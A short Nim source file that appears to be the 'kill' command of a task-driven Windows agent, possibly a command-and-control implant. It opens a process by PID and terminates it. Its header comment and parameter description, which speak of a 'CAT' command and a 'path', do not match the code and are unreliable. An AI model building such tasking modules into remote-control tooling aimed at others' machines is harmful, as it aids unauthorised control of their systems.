# This is the source for the CAT command
import ../structs
import ../utils
import ../rth/utils/winapi_wrapper
import json
import winim/lean

#[
Short Command Description
  {"path": "anwiththestruct"}

]#
proc cmd_kill*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let pid = params["pid"].getInt()

  # Configure Output
  var
    output = ""
    status= ""

  # Do the Magic
  var hProc: HANDLE
  var exitCode: DWORD

  hProc = wOpenProcess(PROCESS_TERMINATE.or(PROCESS_QUERY_LIMITED_INFORMATION), 0, cast[DWORD](pid))

  if hProc == 0:
    return buildReturnData(task.id, output, "error")


  if GetExitCodeProcess(hProc, addr exitCode):
    DBG("Terminating Process")
    if TerminateProcess(hProc, cast[UINT](exitCode)) == FALSE:
      status = "error"
  else:
    status = "error"


  # return the response
  return buildReturnData(task.id, output, status)

